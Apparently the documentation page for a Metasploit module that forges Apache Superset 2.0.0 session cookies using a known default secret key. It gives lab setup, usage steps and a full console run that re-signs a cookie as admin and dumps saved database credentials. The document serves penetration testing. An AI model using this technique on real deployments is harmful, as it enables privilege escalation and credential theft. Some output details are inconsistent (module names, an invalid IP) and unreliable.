
## Vulnerable Application

Apache Superset versions <= 2.0.0 utilize Flask with a known default secret key which is used to sign HTTP cookies.
These cookies can therefore be forged. If a user is able to login to the site, they can decode the cookie, set their user_id to that
of an administrator, and re-sign the cookie. This valid cookie can then be used to login as the targeted user and retrieve database
credentials saved in Apache Superset.

## App Install

```
sudo docker run -p 8088:8088 --name superset apache/superset:2.0.0
sudo docker exec -it superset superset fab create-admin \
              --username admin \
              --firstname Superset \
              --lastname Admin \
              --email admin@superset.com \
              --password admin

sudo docker exec -it superset superset db upgrade
sudo docker exec -it superset superset init
```

Login to the app, click 'list users' under 'Settings', then click '+'.  make a new user with 'Public' as the role.

If you want any database credentials to be pulled, you'll need to configure a database as well.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/apache_superset_priv_esc`
1. Do: `set username [username]`
1. Do: `set password [password]`
1. Do: `run`
1. You should get an admin cookie and the database credentials

## Options

### USERNAME

The username to authenticate as. Required with no default.

### PASSWORD

The password for the specified username. Required with no default.

### ADMIN_ID

The ID of an admin account. Defaults to `1`

### SECRET_KEYS_FILE

A file containing secret keys to try. One per line. Defaults to `metasploit-framework/data/wordlists/superset_secret_keys.txt`

## Scenarios

### Superset 2.0.0 Docker image

```
msf6 > use auxiliary/gather/apache_superset_cookie_sig_priv_esc 
msf6 auxiliary(gather/apache_superset_priv_esc) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 auxiliary(gather/apache_superset_priv_esc) > set username user
username => user
msf6 auxiliary(gather/apache_superset_priv_esc) > set password user
password => user
msf6 auxiliary(gather/apache_superset_priv_esc) > set verbose true
verbose => true
msf6 auxiliary(gather/apache_superset_priv_esc) > run
[*] Running module against 127.0.0.1

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Apache Supset 2.0.0 is vulnerable
[*] 127.0.0.1:8088 - CSRF Token: IjkzNDBmZmI4ZDc4M2I4NWNiYzlmNWQwOGM4NTcwZDUzZGVhZDMwZjEi.ZP8uyQ.iBpplhnMpXOZnjiV1Xh_reR_uLw
[*] 127.0.0.1:8088 - Initial Cookie: session=eyJjc3JmX3Rva2VuIjoiOTM0MGZmYjhkNzgzYjg1Y2JjOWY1ZDA4Yzg1NzBkNTNkZWFkMzBmMSIsImxvY2FsZSI6ImVuIn0.ZP8uyQ.jHXs3u8dqoBUWeL1vjUTxXOWLAo;
[*] 127.0.0.1:8088 - Decoded Cookie: {"csrf_token"=>"9340ffb8d783b85cbc9f5d08c8570d53dead30f1", "locale"=>"en"}
[*] 127.0.0.1:8088 - Attempting login
[+] 127.0.0.1:8088 - Logged in Cookie: session=.eJwNjUEKwyAQRa8isw7FYiXGG3TXfQhhojMmdDCgoaWE3L2uHnx4_50ws2BdqYIfT1BHA3yx5C0n6OCZPyhbVLKnLd_USwgrqaP8FCZsC0zX1LWLQnUFzyiVOgi18Hzsb8rgYTAPzby42DuzOBuWMLCN2gVnex2tiYTRaL63mOwBhZrTxOsPSKAxLA.ZP8uyQ.UvNg89u5vOnyFiip1diP8ABrDCY;
.eJwNjUEKwyAQRa8isw7FYiXGG3TXfQhhojMmdDCgoaWE3L2uHnx4_50ws2BdqYIfT1BHA3yx5C0n6OCZPyhbVLKnLd_USwgrqaP8FCZsC0zX1LWLQnUFzyiVOgi18Hzsb8rgYTAPzby42DuzOBuWMLCN2gVnex2tiYTRaL63mOwBhZrTxOsPSKAxLA.ZP8uyQ.UvNg89u5vOnyFiip1diP8ABrDCY
[*] 127.0.0.1:8088 - Checking secret key: \x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h
[-] 127.0.0.1:8088 - Incorrect Secret Key: \x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h
[*] 127.0.0.1:8088 - Checking secret key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
[+] 127.0.0.1:8088 - Found secret key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
[*] 127.0.0.1:8088 - Modified cookie: {"_flashes"=>[{" t"=>["warning", "Invalid login. Please try again."]}], "_fresh"=>false, "csrf_token"=>"9340ffb8d783b85cbc9f5d08c8570d53dead30f1", "locale"=>"en", "user_id"=>1}
[*] 127.0.0.1:8088 - Attempting to resign with key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
[*] 127.0.0.1:8088 - New signed cookie: eyJfZmxhc2hlcyI6W3siIHQiOlsid2FybmluZyIsIkludmFsaWQgbG9naW4uIFBsZWFzZSB0cnkgYWdhaW4uIl19XSwiX2ZyZXNoIjpmYWxzZSwiY3NyZl90b2tlbiI6IjkzNDBmZmI4ZDc4M2I4NWNiYzlmNWQwOGM4NTcwZDUzZGVhZDMwZjEiLCJsb2NhbGUiOiJlbiIsInVzZXJfaWQiOjF9.ZP8uyQ.7Rgp9a7iPK-m7NQRbWpixG62CMo
[+] 127.0.0.1:8088 - Cookie validated to user: admin
[+] Found Super Secret DB: postgresql://dbuser:mysecretpassword@1.1.1.1:15432/supersetdb
[*] Done enumerating databases
[*] Auxiliary module execution completed
msf6 auxiliary(gather/apache_superset_priv_esc) > creds
Credentials
===========

host           origin         service           public  private       realm  private_type  JtR Format
----           ------         -------           ------  -------       -----  ------------  ----------
111.222.3.444  111.222.3.444  3306/tcp (mysql)  root    my-secret-pw         Password      
```
